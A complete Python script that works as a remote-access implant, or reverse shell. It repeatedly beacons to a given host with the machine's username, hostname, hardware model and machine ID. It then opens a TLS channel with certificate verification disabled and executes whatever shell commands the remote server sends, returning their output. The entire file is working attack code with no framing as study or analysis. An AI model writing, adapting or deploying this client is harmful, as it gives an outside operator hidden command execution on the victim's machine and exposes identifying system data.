#!/usr/bin/env python3

import argparse
import json
import socket
import ssl
import getpass

import secrets
import string
import subprocess
from os import chdir, getcwd, getlogin, path

from pathlib import Path
from time import sleep
from urllib.request import Request, urlopen

parser = argparse.ArgumentParser()

parser.add_argument("-H", "--host", required=True, help="Endpoint Host")
parser.add_argument("-p", "--port", required=True, help="Endpoint Port")

parser.add_argument(
    "proto",
    nargs="?",
    default="http",
    choices=["http", "https"],
    help="Connection Protocol",
)

args = parser.parse_args()

alphabet = string.ascii_letters + string.digits
sid = ''.join(secrets.choice(alphabet) for _ in range(16))

def get_info():
    return {
        "sid": sid,
        "username": getpass.getuser(),
        "hostname": socket.gethostname(),
        "model": Path("/sys/class/dmi/id/product_name").read_text().strip(),
        "machine_id": Path("/etc/machine-id").read_text().strip(),
    }

def get_prompt() -> str:
    username = getlogin()
    hostname = socket.gethostname()
    cwd = getcwd()

    # shorten home dir to ~
    home = path.expanduser("~")
    if cwd.startswith(home):
        cwd = "~" + cwd[len(home):]

    return f"{username}@{hostname}:{cwd} >$ "

def ping():
    url = f"{args.proto}://{args.host}:{args.port}/ping"

    while True:
        try:
            req = Request(
                url,
                data=json.dumps(get_info()).encode(),
                headers={"Content-Type": "application/json"},
                method="POST",
            )

            with urlopen(req) as response:
                result = json.load(response)

            print(result)

            if result.get("message") == "pong" and result.get("conn", 0):
                communicate(result["conn"])

        except Exception as e:
            print(f"[PING] {e}")

        sleep(5)


def communicate(port: int):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while True:
        try:
            print(f"[*] Connecting to {args.host}:{port}...")

            raw = socket.create_connection((args.host, port), timeout=10)

            with context.wrap_socket(
                raw,
                server_hostname=args.host,
            ) as tls:
                print("[+] TLS connected")
                tls.sendall(
                    (json.dumps(get_info())).encode("utf-8")
                )
                print("[+] Listening")
                listen(tls)
        except Exception as e:
            print(f"[TLS] {e}")
            print("[*] Retrying in 2 seconds...")
            sleep(2)

def listen(tls: ssl.SSLSocket):
    while True:
        try:
            data = tls.recv(4096)

            if not data:
                print("Server disconnected")
                break

            cmdlet = data.decode("utf-8").strip()
            if cmdlet == "exit":
                print("[*] Disconnect by remote host")
                return
            print(f"[SERVER] {cmdlet}")
            
            output = get_prompt() + cmdlet + "\n"

            cmd_split = cmdlet.split(" ")
            if cmd_split[0] == "cd":
                chdir(cmd_split[1])
                tls.sendall(output.encode())
            else:
                output += subprocess.getoutput(cmdlet)
                tls.sendall(output.encode())
        except ConnectionResetError:
            print("Connection reset")
            return
        except TimeoutError as e:
            print(e)
            continue
        except ssl.SSLError as e:
            print(e)
            return

def main():
    ping()

if __name__ == "__main__":
    main()